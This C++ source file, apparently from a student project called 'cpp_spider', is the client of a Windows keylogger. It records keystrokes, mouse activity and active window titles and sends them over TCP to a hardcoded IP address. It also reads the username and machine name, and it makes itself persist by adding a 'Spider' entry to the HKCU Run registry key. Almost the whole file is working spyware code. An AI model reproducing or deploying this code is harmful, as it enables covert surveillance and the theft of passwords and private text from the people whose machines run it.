/*
** Client.cpp for cpp_spider in cpp_spider\Client\Sources
**
** Made by august_t
** Login   <august_t@epitech.net>
**
** Started on  Fri Sep 29 15:30:41 2017 august_t
** Last update Sun Oct 08 23:13:17 2017 august_t
*/

#include "Client.hpp"

Client::Client(boost::asio::io_service& io_service) : _socket(io_service), _endpoint(boost::asio::ip::address::from_string("10.16.253.119"), 8080)
{
}

Client::~Client()
{

}

Client::pointer       Client::createPointer(boost::asio::io_service& io_service)
{
  return pointer(new Client(io_service));
}

boost::asio::ip::tcp::socket&   Client::createSocket()
{
  return _socket;
}

void                  Client::connect()
{
//  const boost::system::error_code error;

  _key.init();
  _socket.async_connect(_endpoint, boost::bind(&Client::connectVerif, this, boost::asio::placeholders::error));
  _needSend = false;
}

void                  Client::connectVerif(const boost::system::error_code& error)
{
    if (!error)
    {
      _isConnected = true;
      sendKeyStrokes(error);
    }
    else
    {
      _isConnected = false;
      _socket.async_connect(_endpoint, boost::bind(&Client::connectVerif, this, boost::asio::placeholders::error));
    }
}

void                  Client::connectVerif2(const boost::system::error_code& error)
{
  if (!error)
  {
    _isConnected = true;
  }
  else
  {
    _isConnected = false;
    _socket.async_connect(_endpoint, boost::bind(&Client::connectVerif2, this, boost::asio::placeholders::error));
  }
}

void                  Client::sendKeyStrokes(const boost::system::error_code& error)
{
  std::string keyStr;
  std::string mouStr;
  std::string taskStr;

    if (getActiveWindowTitle().size() > 0)
    {
     if (getActiveWindowTitle().size() <= 999)
     taskStr = "0";
    if (getActiveWindowTitle().size() <= 99)
     taskStr = "00";
    if (getActiveWindowTitle().size() <= 9)
     taskStr = "000";

    taskStr += boost::lexical_cast<std::string>(getActiveWindowTitle().size() + 1);
    taskStr += " ";
    taskStr += getActiveWindowTitle();

    std::cout << taskStr << std::endl;
    clientWrite(error, taskStr);
    }
  if (_key.getKeyboardBuffer().size() > 0)
  {
   if (_key.getKeyboardBuffer().size() <= 999)
   keyStr = "0";
  if (_key.getKeyboardBuffer().size() <= 99)
   keyStr = "00";
  if (_key.getKeyboardBuffer().size() <= 9)
   keyStr = "000";

  keyStr += boost::lexical_cast<std::string>(_key.getKeyboardBuffer().size() + 1);
  keyStr += " ";
  keyStr += _key.getKeyboardBuffer();
  _key.eraseKeyboardString();

  std::cout << keyStr << std::endl;
  if (_isConnected == true)
    clientWrite(error, keyStr);
  }
  if (_key.getMouseBuffer().size() > 0)
  {
   if (_key.getMouseBuffer().size() <= 999)
   mouStr = "0";
  if (_key.getMouseBuffer().size() <= 99)
   mouStr = "00";
  if (_key.getMouseBuffer().size() <= 9)
   mouStr = "000";

   mouStr += boost::lexical_cast<std::string>(_key.getMouseBuffer().size() + 1);
   mouStr += " ";
   mouStr += _key.getMouseBuffer();

   _key.eraseMouseString();
   std::cout << mouStr << std::endl;
   if (_isConnected == true)
    clientWrite(error, mouStr);
  }
  clientRead(error);
}

void                  Client::clientVerif(const boost::system::error_code& error)
{
  Sleep(1000);
  if ((_key.getKeyboardBuffer().size() > 0) || (_key.getMouseBuffer().size() > 0))
    sendKeyStrokes(error);
  if (!error)
  {
    std::string s( (std::istreambuf_iterator<char>(&_buf)), std::istreambuf_iterator<char>() );
    std::cout << s << std::endl;
    clientRead(error);
  }
  else
  {
    clientRead(error);
  }
}

void                  Client::clientWrite(const boost::system::error_code& error, std::string data)
{
  boost::asio::async_write(this->_socket, boost::asio::buffer(data),
  boost::bind(&Client::clientVerif, this, boost::asio::placeholders::error));
}

void                  Client::clientRead(const boost::system::error_code& error)
{
    boost::asio::async_read_until(this->_socket, this->_buf, '\n', boost::bind(&Client::clientVerif, this, boost::asio::placeholders::error));
    clientVerif(error);
}

bool                  Client::isConnected()
{
  if (_isConnected == true)
    return (true);
  return (false);
}

void            Client::start()
{}

void            Client::stop()
{
  _socket.close();
}

std::string     Client::getUsername()
{
   char         username[UNLEN + 1];
   DWORD        usernameLen = sizeof(username);

   GetUserName(username, &usernameLen);
   return (username);
}

std::string     Client::getComputerName()
{
   char         computerName[UNLEN + 1];
   DWORD        computerNameLen = sizeof(computerName);

   GetComputerName(computerName, &computerNameLen);
   return (computerName);
}

std::string   Client::getActiveWindowTitle()
{
  char        title[256];
  HWND        hwnd=GetForegroundWindow();

  GetWindowText(hwnd, title, sizeof(title));
  return (title);
}

void            Client::startWithWindows()
{

    std::string     progName;
    std::string     startupPath;

    char            getPath[_MAX_PATH + 1];

    GetModuleFileName(NULL, getPath, _MAX_PATH);
    std::string     progPath(getPath);
    std::cout << progPath << std::endl;

    progName = "Spider";
    startupPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, startupPath.c_str(), &hkey);
    LONG status = RegSetValueEx(hkey, progName.c_str(), 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));
}
